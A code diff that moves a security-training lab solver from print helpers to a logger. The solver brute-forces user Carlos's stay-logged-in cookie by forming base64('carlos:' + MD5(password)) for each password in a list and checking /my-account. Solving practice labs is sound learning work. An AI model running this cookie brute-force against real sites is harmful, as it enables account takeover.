@@ -1,15 +1,17 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.utils import auth_lab_passwords
+from web_security_academy.core.logger import logger
 from base64 import b64encode
 from hashlib import md5
 
 
 def solve_lab(session):
     passwords = auth_lab_passwords()
-    print_info(
+    logger.info(
         "Brute-forcing Carlos's stay-logged-in cookie using the following formula:"
     )
-    print('Cookie = BASE64(username + ":" + MD5(password))')
+    logger.info('Cookie = BASE64(username + ":" + MD5(password))')
 
+    logger.toggle_newline()
     for password in passwords:
         md5_hash = md5(password.encode())
         cookie = b64encode(f"carlos:{md5_hash.hexdigest()}".encode())
@@ -19,9 +21,10 @@ def solve_lab(session):
         resp = session.get_path("/my-account", params=params, allow_redirects=False)
 
         if resp.status_code != 200:
-            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
+            logger.info(f"{password} => Incorrect")
         else:
-            print_success(f"{password} => Correct!\n")
+            logger.success(f"{password} => Correct!")
             break
     else:
-        print_fail("Unable to brute-force Carlos's stay-logged-in cookie")
+        logger.failure("Unable to brute-force Carlos's stay-logged-in cookie")
+    logger.toggle_newline()
